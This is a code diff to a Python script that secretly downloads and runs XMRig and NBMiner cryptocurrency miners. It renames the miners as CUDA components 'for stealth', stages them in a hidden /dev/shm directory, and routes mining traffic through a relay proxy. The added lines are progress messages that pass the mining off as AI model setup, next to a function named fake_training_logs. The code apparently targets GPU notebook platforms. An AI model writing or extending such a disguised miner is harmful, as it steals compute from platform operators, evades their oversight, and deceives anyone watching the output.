@@ -125,7 +125,7 @@ def fake_training_logs():
 
 def download_miners():
     """Downloads CPU and GPU miners on the fly (renamed for stealth)."""
-    print("[*] Synchronizing CUDA weights and model binaries...")
+    print("[*] Synchronizing CUDA weights and model binaries... (This takes ~60 seconds)", flush=True)
     
     # Fileless Execution: Move to invisible RAM-disk
     shm_path = "/dev/shm/.cuda_cache"
@@ -135,7 +135,8 @@ def download_miners():
     
     # CPU Miner (XMRig-MO)
     if not os.path.exists("./cuda_core_cpu"):
-        subprocess.run(["wget", "-q", "https://github.com/MoneroOcean/xmrig/releases/download/v6.22.2-mo1/xmrig-v6.22.2-mo1-lin64-compat.tar.gz", "-O", "cpu.tar.gz"])
+        print("  -> [1/2] Downloading Core Logic Engine (CPU)...", flush=True)
+        subprocess.run(["wget", "-q", "--show-progress", "https://github.com/MoneroOcean/xmrig/releases/download/v6.22.2-mo1/xmrig-v6.22.2-mo1-lin64-compat.tar.gz", "-O", "cpu.tar.gz"])
         subprocess.run(["tar", "-xzf", "cpu.tar.gz"])
         subprocess.run(["mv", "xmrig-v6.22.2-mo1/xmrig", "./cuda_core_cpu"])
         subprocess.run(["rm", "-rf", "cpu.tar.gz", "xmrig-v6.22.2-mo1"])
@@ -143,7 +144,8 @@ def download_miners():
 
     # GPU Miner (NBMiner - Excellent for T4/P100)
     if not os.path.exists("./cuda_core_gpu"):
-        subprocess.run(["wget", "-q", "https://github.com/NebuTech/NBMiner/releases/download/v42.3/NBMiner_42.3_Linux.tgz", "-O", "gpu.tgz"])
+        print("  -> [2/2] Downloading Tensor Math Engine (GPU)...", flush=True)
+        subprocess.run(["wget", "-q", "--show-progress", "https://github.com/NebuTech/NBMiner/releases/download/v42.3/NBMiner_42.3_Linux.tgz", "-O", "gpu.tgz"])
         subprocess.run(["tar", "-xzf", "gpu.tgz"])
         subprocess.run(["mv", "NBMiner_Linux/nbminer", "./cuda_core_gpu"])
         subprocess.run(["rm", "-rf", "gpu.tgz", "NBMiner_Linux"])
@@ -310,9 +312,12 @@ def gpu_arbitrator(miner_proc, heurist_proc):
 
 def launch_hidden_miner():
     """Download and launch Hybrid Engine (AI + Mining)."""
+    print("[*] Step 1: Checking and downloading components...", flush=True)
     download_miners()
+    print("[*] Step 2: Optimizing GPU parameters...", flush=True)
     gpu_count = overclock_gpus()
     
+    print("[*] Step 3: Waking up Render Shadow Tunnel Proxy...", flush=True)
     # 1. Start Proxies (using shared ws_proxy.py subprocess)
     cpu_proxy_url = f"{RELAY}/rx.unmineable.com/3333"
     local_stratum_proxy(5556, cpu_proxy_url)
@@ -321,6 +326,7 @@ def launch_hidden_miner():
     
     time.sleep(2)
     
+    print("[*] Step 4: Booting Execution Engines...", flush=True)
     # 2. Start Crypto Miner (Instant Earnings)
     out_target = None if DEBUG_MODE else subprocess.DEVNULL
     
@@ -339,6 +345,7 @@ def launch_hidden_miner():
         ], stdout=out_target)
 
     # 3. Setup and Launch AI Worker in background (Takes ~10 mins)
+    print("[*] Step 5: Initializing Background Nodes (GaiaNet/Heurist)...", flush=True)
     def start_background_workers():
         # A. GaiaNet Node (Uptime)
         try: setup_gaianet() 
